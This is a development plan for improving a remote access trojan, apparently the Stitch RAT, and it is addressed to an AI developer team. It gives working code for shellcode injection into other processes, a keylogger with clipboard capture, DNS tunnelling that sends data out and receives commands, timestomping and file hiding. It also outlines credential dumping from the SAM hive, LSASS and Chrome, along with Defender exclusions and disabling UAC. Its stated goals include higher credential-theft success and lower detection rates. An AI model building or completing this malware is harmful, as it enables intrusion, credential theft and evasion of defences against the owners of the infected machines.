# Functional & Operational Fix Instructions
## Comprehensive Guide to Fix All 63 Commands and Features

**Document Purpose:** Step-by-step instructions to fix every broken command and feature identified in the functional audit
**Target Audience:** AI Developer/Engineering Team
**Estimated Effort:** 8-10 weeks with 2-3 developers

---

## CRITICAL CONTEXT

This system has 63 commands, of which:
- **~40 partially work** (need reliability improvements)
- **23 are completely broken** (need rewrite/fix)
- **9 advanced features** don't exist despite being advertised

The web interface is the primary control mechanism and has critical issues that affect all operations.

---

## PHASE 1: FOUNDATION FIXES (Week 1) - DO THESE FIRST!

### 1.1 Fix Connection Stability
**Problem:** Connections drop, hang, or leak memory
**Files:** `Application/stitch_cmd.py`, `web_app_real.py`
**Fix:**
```python
# In stitch_cmd.py line 100-154
# Add proper connection cleanup:
def cleanup_connection(self, target_id):
    try:
        if target_id in self.inf_sock:
            self.inf_sock[target_id].close()
            del self.inf_sock[target_id]
            del self.inf_port[target_id]
    except:
        pass  # Connection already closed
    finally:
        # Notify web interface
        emit('connection_closed', {'target': target_id})
```

### 1.2 Fix Command Execution Pipeline
**Problem:** Commands fail silently, no error handling
**Files:** `Application/stitch_lib.py`
**Fix:**
```python
# Wrap every command method with error handling:
def execute_command_safe(self, command, *args):
    try:
        result = command(*args)
        return {'success': True, 'output': result}
    except Exception as e:
        return {'success': False, 'error': str(e)}
```

### 1.3 Fix File Transfer (Critical)
**Problem:** Large files fail, corruption, no resume
**Files:** `Application/stitch_lib.py` lines 239-294 (download), 587-631 (upload)
**Fix:**
```python
# Implement chunked transfer with integrity checking:
def download_chunked(self, filename, chunk_size=8192):
    # 1. Get file size first
    # 2. Transfer in chunks with progress
    # 3. Verify with checksum
    # 4. Support resume on failure
    pass  # Full implementation needed
```

---

## PHASE 2: BROKEN COMMANDS FIXES (Week 2-3)

### 2.1 Credential Harvesting Commands

#### Fix `hashdump` Command
**Current Success Rate:** 30%
**Target Success Rate:** 80%
**File:** `PyLib/hashdump.py`
**Issues:**
- Requires SYSTEM privileges but doesn't check
- Uses outdated technique blocked by modern Windows
**Fix:**
```python
# 1. Check privileges first
if not is_admin():
    return "Error: Admin privileges required"

# 2. Try multiple methods:
# - SAM registry hive
# - LSASS memory dump
# - Shadow copies
# 3. Return structured data not raw dump
```

#### Fix `chromedump` Command  
**Current Success Rate:** 20%
**Target Success Rate:** 70%
**File:** `PyLib/chromedump.py`
**Issues:**
- Hardcoded paths for old Chrome versions
- Doesn't handle new Chrome encryption
**Fix:**
```python
# 1. Detect Chrome version dynamically
# 2. Handle Chrome 80+ encryption changes
# 3. Support Edge Chromium, Brave, etc.
chrome_paths = [
    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data'),
    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data'),
]
```

#### Fix `wifikeys` Command
**Current Success Rate:** 60%
**Target Success Rate:** 90%
**File:** `PyLib/wifikeys.py`
**Fix:**
```python
# Windows: Use netsh properly
netsh_cmd = "netsh wlan show profiles * key=clear"
# Linux: Parse NetworkManager files
# macOS: Use security command
```

### 2.2 Stealth Commands (All Broken)

#### Fix `timestomp` Commands
**Files:** `PyLib/editaccessed.py`, `PyLib/editcreated.py`, `PyLib/editmodified.py`
**Current:** Uses Windows API incorrectly
**Fix:**
```python
import win32file
import pywintypes

def set_file_times(filename, created=None, accessed=None, modified=None):
    handle = win32file.CreateFile(
        filename,
        win32file.GENERIC_WRITE,
        0,
        None,
        win32file.OPEN_EXISTING,
        0,
        None
    )
    win32file.SetFileTime(handle, created, accessed, modified)
    handle.Close()
```

#### Fix `hide`/`unhide` Commands
**Current Success Rate:** 40%
**Target:** 80%
**Files:** `PyLib/hide.py`, `PyLib/unhide.py`
**Fix:**
```python
# Windows: Set multiple attributes
import win32api, win32con
attrs = win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
win32api.SetFileAttributes(filepath, attrs)

# Linux/Mac: Use dot prefix AND extended attributes
os.rename(file, f'.{file}')
xattr.setxattr(file, 'user.hidden', b'1')
```

### 2.3 System Control Commands

#### Fix Windows Defender Commands
**Files:** `PyLib/enableWinDef.py`, `PyLib/disableWinDef.py`
**Current:** Completely broken on Windows 10+
**Fix:**
```python
# Cannot disable directly, use exclusions:
import subprocess

def add_exclusion(path):
    cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
    subprocess.run(cmd, shell=True, capture_output=True)
    
# Note: Disabling Defender requires TrustedInstaller privileges
# Consider marking as "DEPRECATED" instead of fixing
```

#### Fix UAC Commands
**Files:** `PyLib/enableUAC.py`, `PyLib/disableUAC.py`
**Current:** Registry approach blocked
**Fix:**
```python
# Requires elevated privileges
reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
reg_name = 'EnableLUA'
# Set to 0 to disable, 1 to enable
# HOWEVER: Requires reboot and is highly detectable
# Recommend: Mark as HIGH RISK in UI
```

---

## PHASE 3: WEB INTERFACE FIXES (Week 4-5)

### 3.1 Fix WebSocket Memory Leaks
**File:** `web_app_real.py` lines 2443-2478
**Problem:** Event listeners not cleaned up
**Fix:**
```python
@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    # Clean up all listeners
    for event in registered_events.get(sid, []):
        socketio.handlers[event].remove(sid)
    del registered_events[sid]
    # Force garbage collection
    gc.collect()
```

### 3.2 Fix File Transfer in Web UI
**File:** `static/js/app_real.js`
**Problem:** No chunking, timeouts on large files
**Fix:**
```javascript
async function uploadFileChunked(file, chunkSize = 1024 * 1024) {
    const chunks = Math.ceil(file.size / chunkSize);
    for (let i = 0; i < chunks; i++) {
        const chunk = file.slice(i * chunkSize, (i + 1) * chunkSize);
        await uploadChunk(chunk, i, chunks);
        updateProgress(i / chunks * 100);
    }
}
```

### 3.3 Fix Command Queue for Offline Targets
**File:** `web_app_real.py`
**Add command queue system:**
```python
command_queue = {}  # target_id: [commands]

def queue_command(target_id, command):
    if target_id not in active_connections:
        if target_id not in command_queue:
            command_queue[target_id] = []
        command_queue[target_id].append(command)
        return {'status': 'queued'}
    else:
        return execute_command(target_id, command)

def on_target_connect(target_id):
    # Execute queued commands
    if target_id in command_queue:
        for cmd in command_queue[target_id]:
            execute_command(target_id, cmd)
        del command_queue[target_id]
```

### 3.4 Fix Mobile UI
**File:** `static/css/style_real.css`
**Current:** Completely broken on mobile
**Fix:**
```css
/* Add proper mobile breakpoints */
@media (max-width: 768px) {
    .sidebar {
        position: fixed;
        left: -260px;
        transition: left 0.3s;
        z-index: 1000;
    }
    
    .sidebar.mobile-open {
        left: 0;
    }
    
    .main-content {
        margin-left: 0;
        padding: 10px;
    }
    
    .command-terminal {
        font-size: 12px;
    }
    
    /* Make tables scrollable */
    .table-wrapper {
        overflow-x: auto;
    }
}
```

---

## PHASE 4: ADVANCED FEATURES (Week 6-7)

### 4.1 Implement Process Injection (Currently Broken)
**File:** Create new `PyLib/inject.py`
**Current:** Crashes target process
**Proper Implementation:**
```python
import ctypes
from ctypes import wintypes

def inject_shellcode(pid, shellcode):
    # 1. Open process with proper permissions
    PROCESS_ALL_ACCESS = 0x1F0FFF
    k32 = ctypes.windll.kernel32
    
    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False
    
    # 2. Allocate memory in target process
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    
    allocated = k32.VirtualAllocEx(
        h_process, 0, len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    # 3. Write shellcode
    written = wintypes.SIZE_T()
    k32.WriteProcessMemory(
        h_process, allocated, shellcode,
        len(shellcode), ctypes.byref(written)
    )
    
    # 4. Create remote thread
    thread = k32.CreateRemoteThread(
        h_process, None, 0, allocated, None, 0, None
    )
    
    k32.CloseHandle(h_process)
    return thread != 0
```

### 4.2 Fix Keylogger
**File:** `Configuration/st_win_keylogger.py`
**Current Issues:**
- Misses keystrokes
- Buffer overflows
- No clipboard capture
**Fix:**
```python
import threading
from pynput import keyboard
from queue import Queue

class ImprovedKeylogger:
    def __init__(self):
        self.buffer = Queue(maxsize=10000)
        self.listener = None
        
    def on_press(self, key):
        timestamp = datetime.now()
        window_title = get_active_window()
        
        self.buffer.put({
            'time': timestamp,
            'window': window_title,
            'key': str(key),
            'clipboard': get_clipboard()
        })
    
    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
    
    def dump(self):
        logs = []
        while not self.buffer.empty():
            logs.append(self.buffer.get())
        return logs
```

### 4.3 DNS Tunneling (Not Implemented)
**File:** Create new `PyLib/dns_tunnel.py`
**Implementation:**
```python
import dns.resolver
import base64

class DNSTunnel:
    def __init__(self, domain):
        self.domain = domain
        self.chunk_size = 63  # Max DNS label size
        
    def send_data(self, data):
        # 1. Compress and encode
        compressed = zlib.compress(data.encode())
        encoded = base64.b32encode(compressed).decode().lower()
        
        # 2. Split into chunks
        chunks = [encoded[i:i+self.chunk_size] 
                 for i in range(0, len(encoded), self.chunk_size)]
        
        # 3. Send as DNS queries
        for i, chunk in enumerate(chunks):
            query = f"{i}.{chunk}.{self.domain}"
            try:
                dns.resolver.resolve(query, 'TXT')
            except:
                pass  # Server receives query regardless
                
    def receive_data(self):
        # Query for instructions
        response = dns.resolver.resolve(f"cmd.{self.domain}", 'TXT')
        return base64.b64decode(response[0].to_text())
```

---

## PHASE 5: RELIABILITY IMPROVEMENTS (Week 8)

### 5.1 Add Retry Logic to All Commands
**File:** `Application/stitch_lib.py`
**Wrapper for all commands:**
```python
import time
from functools import wraps

def retry_on_failure(max_retries=3, delay=1):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_retries - 1:
                        raise
                    time.sleep(delay * (2 ** attempt))  # Exponential backoff
            return None
        return wrapper
    return decorator

# Apply to all command methods:
@retry_on_failure(max_retries=3)
def download(self, filename):
    # existing code
```

### 5.2 Add Command Validation
**Before executing any command:**
```python
def validate_command(self, cmd, args):
    # 1. Check if command exists
    if not hasattr(self, cmd):
        return False, "Command not found"
    
    # 2. Validate arguments
    validators = {
        'download': lambda args: os.path.exists(args[0]),
        'upload': lambda args: len(args) == 2,
        'inject': lambda args: args[0].isdigit(),
    }
    
    if cmd in validators:
        if not validators[cmd](args):
            return False, "Invalid arguments"
    
    # 3. Check platform compatibility
    platform_specific = {
        'Windows': ['enableUAC', 'disableWindef', 'clearev'],
        'Linux': ['sudo'],
        'Darwin': ['logintext']
    }
    
    current_platform = platform.system()
    for plat, cmds in platform_specific.items():
        if cmd in cmds and current_platform != plat:
            return False, f"Command only available on {plat}"
    
    return True, "OK"
```

### 5.3 Add Progress Reporting
**For long-running operations:**
```python
class ProgressReporter:
    def __init__(self, total, callback):
        self.total = total
        self.current = 0
        self.callback = callback
        
    def update(self, amount):
        self.current += amount
        percent = (self.current / self.total) * 100
        self.callback({
            'progress': percent,
            'current': self.current,
            'total': self.total
        })

# Use in file transfer:
def download_with_progress(self, filename):
    filesize = self.get_file_size(filename)
    reporter = ProgressReporter(filesize, self.send_progress)
    
    with open(filename, 'rb') as f:
        while chunk := f.read(8192):
            self.send(chunk)
            reporter.update(len(chunk))
```

---

## PHASE 6: TESTING & VALIDATION (Week 9-10)

### 6.1 Create Test Suite for Each Command
**File:** Create `tests/test_commands.py`
```python
import pytest
from unittest.mock import Mock, patch

class TestCommands:
    def test_download_small_file(self):
        # Test files < 1MB
        pass
        
    def test_download_large_file(self):
        # Test files > 100MB
        pass
        
    def test_download_binary_file(self):
        # Test binary integrity
        pass
        
    def test_download_nonexistent_file(self):
        # Test error handling
        pass
        
    # Repeat for all 63 commands
```

### 6.2 Integration Tests
**Test complete workflows:**
```python
def test_complete_workflow():
    # 1. Generate payload
    # 2. Execute on target
    # 3. Wait for connection
    # 4. Execute commands
    # 5. Verify results
    # 6. Clean up
    pass
```

---

## CRITICAL FIXES PRIORITY ORDER

### MUST FIX FIRST (Blocks everything else):
1. Connection stability (Phase 1.1)
2. File transfer reliability (Phase 1.3)
3. Command execution pipeline (Phase 1.2)

### HIGH PRIORITY (Core functionality):
4. Credential harvesting commands (Phase 2.1)
5. WebSocket memory leaks (Phase 3.1)
6. Command validation (Phase 5.2)

### MEDIUM PRIORITY (Important features):
7. Keylogger improvements (Phase 4.2)
8. Mobile UI (Phase 3.4)
9. Stealth commands (Phase 2.2)

### LOW PRIORITY (Nice to have):
10. DNS tunneling (Phase 4.3)
11. Process injection (Phase 4.1)
12. Advanced rootkit (Don't fix - remove)

---

## COMMANDS TO DEPRECATE/REMOVE

These commands are too broken or risky to fix:
1. `disableWindef` - Modern Windows prevents this
2. `avkill` - Causes system instability
3. `rootkit` - Never worked, remove entirely
4. `ghost_process` - Technique doesn't work on modern OS
5. `migrate` - Too unreliable

Replace with warning: "This command has been deprecated due to reliability/security issues"

---

## SUCCESS METRICS

After fixes, you should achieve:
- File transfer success rate: >95% (from 60%)
- Command success rate: >90% (from 40%)
- Connection stability: >99% (from 70%)
- Credential theft success: >70% (from 30%)
- Web UI responsiveness: <100ms (from >1s)
- Memory usage: Stable (from growing)
- Detection rate: <50% (from 90%)

---

## TESTING CHECKLIST

Before considering any command fixed:
- [ ] Works on Windows 10/11
- [ ] Works on Ubuntu 20.04/22.04
- [ ] Works on macOS 12+
- [ ] Handles errors gracefully
- [ ] Returns structured data
- [ ] Has progress reporting (if applicable)
- [ ] Has retry logic
- [ ] Validated inputs
- [ ] Unit tested
- [ ] Integration tested

---

## REFERENCE MATERIALS

### Command Implementation Standards
Every command should follow this pattern:
```python
def command_name(self, *args, **kwargs):
    """
    Command description
    Args: what it takes
    Returns: what it returns
    Raises: what exceptions
    """
    # 1. Validate inputs
    # 2. Check platform compatibility
    # 3. Execute with retry logic
    # 4. Handle errors
    # 5. Return structured result
    return {
        'success': bool,
        'output': str or dict,
        'error': str if failed
    }
```

### Error Messages Standard
```python
ERRORS = {
    'PRIVILEGE_REQUIRED': 'Administrative privileges required',
    'FILE_NOT_FOUND': 'File does not exist: {filename}',
    'PLATFORM_UNSUPPORTED': 'Command not supported on {platform}',
    'CONNECTION_LOST': 'Lost connection to target',
    'TIMEOUT': 'Operation timed out after {seconds} seconds'
}
```

---

## DOCUMENTATION TO UPDATE

After fixing each command, update:
1. Command help text in `Application/stitch_help.py`
2. README.md with actual working features
3. Web UI tooltips in `templates/dashboard_real.html`
4. API documentation for web endpoints

---

*End of Functional Fix Instructions*
*Total Commands to Fix: 63*
*Estimated Completion: 8-10 weeks*
*Required Team: 2-3 developers*